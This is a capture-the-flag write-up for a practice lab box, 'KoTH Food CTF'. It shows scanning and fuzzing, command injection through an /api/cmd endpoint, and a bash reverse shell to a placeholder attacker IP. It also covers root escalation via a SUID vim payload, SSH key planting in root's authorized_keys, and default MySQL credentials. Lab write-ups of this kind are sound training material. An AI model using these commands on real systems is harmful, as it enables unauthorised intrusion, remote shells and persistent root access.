
# KoTH Food CTF

Get all 8 flags.

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.30.69 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

[x] 22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

[x] 3306/tcp  open  mysql   syn-ack ttl 63 MySQL 5.7.29-0ubuntu0.18.04.1

[x] 9999/tcp  open  abyss?  syn-ack ttl 63

[x] 15065/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

[x] 16109/tcp open  unknown syn-ack ttl 63

[x] 46969/tcp open  telnet  syn-ack ttl 63 Linux telnetd

Okay, first of all, let's visit the http service at port 15065.
I says the the site is down for maintenance, but we won't believe it and fire up
ffuf:

```bash
$ ./ffuf -u http://10.10.30.69:15065/FUZZ -ic -of html -o ~/CTF/KoTHFoodCTF/ffuf-report.html -t 55 -w ~/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

We did a good job: a page ***monitor*** showed up! After navigating to the page, we
can see that it has an ability to ping other hosts. Specify your IP address and hit
the "Ping" button. Now, open DevTools in your browser and inspect the request.

See that we send the command, and not just your IP?

> ping -c 4 $THE_IP

It seems like we can send arbitrary commands and server will execute them!
Try this one in your terminal and see what happens:

```bash
$ curl -X POST http://10.10.30.69:15065/api/cmd -H "Content-Type: text/plain" -d 'id'
```

Ok, it's time for serios hacking. First, setup your netcat listener:

```bash
$ nc -lvnp 8080
```

Then, force the server to execute a reverse shell:

```bash
$ curl -X POST http://10.10.30.69:15065/api/cmd -H "Content-Type: text/plain" -d 'bash -i >& /dev/tcp/$ATTACKER_IP_GOES_HERE/8080 0>&1'
```

Now, we have a shell, but as a lousy "bread" user. Let's escalate our privileges.
First, run this command to find all files with SUID bit set:

```bash
$ find / -type f -perm -u=s 2>/dev/null
```

You'll see bunch of files, but the most interesting is ***vim***. Use [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#suid)
to find the payload for vim with SUID exploitation. But first, check the python version
with the following command:

```bash
$ which python
# Nothing
$ which python3
# Python3 is installed!
```

Now, root the server:

```bash
$ vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

You have EUID and EGID of root now! Awesome, but this kind of shell sucks.
Lets abuse the SSH service to get an upgrade.

On the attacker machine, do

```bash
$ ssh-keygen

## And set ./root_id_rsa as the filename

$ chmod 600 root_id_rsa

$ python3 -m http.server 3000
```

Next, on the victim machine, navigate to /root/.ssh and execute the following code:

```bash
$ curl http://$ATTCKER_IP_GOES_HERE:3000/root_id_rsa.pub >> authorized_keys
```

Now, kill the python http server and connect to the victim via ssh:

```bash
$ ssh root@10.10.30.69 -i root_id_rsa
```

So, flags located at:

1. /home/bread/flag
2. /home/food/.flag
3. /root/flag
4. /home/tryhackme/flag7
5. Connect to MySQL database with default credentials (root:root):

```bash
$ mysql -h 127.0.0.1 -u root -p
```

Traverse through the DB:

```sql
$ SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
$ USE users;
$ SHOW TABLES;
+-----------------+
| Tables_in_users |
+-----------------+
| User            |
+-----------------+
$ SELECT * FROM User;
```

6. /var/flag.txt
7. ?
8. ?

Some useless stuff I found:

- /home/tryhackme/img.jpg

Trnsfer file to your machine:

```bash
$ scp -i root_id_rsa root@10.10.30.69:/home/tryhackme/img.jpg .
```

And extract creds for pasta:

```bash
$ steghide extract -sf img.jpg
```
